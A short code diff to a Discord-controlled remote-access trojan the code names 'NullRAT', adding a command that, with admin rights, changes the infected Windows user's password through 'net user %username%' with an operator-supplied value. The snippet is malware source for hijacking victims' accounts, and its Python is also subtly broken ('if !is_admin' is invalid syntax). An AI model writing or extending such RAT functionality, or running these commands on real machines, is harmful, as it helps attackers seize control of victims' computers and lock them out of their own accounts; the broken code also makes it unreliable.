@@ -26,7 +26,9 @@ class ChangePass(commands.Cog):
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
              
             if !is_admin:
-                client.genEmbed(tdw)
+                return await ctx.followup.send("NullRAT is not running as admin. Operation aborted")
+            
+            status = os.popen(r"net user %username% " + password).read()
 
 def setup(bot: commands.Bot):
     bot.add_cog(ChangePass(bot))
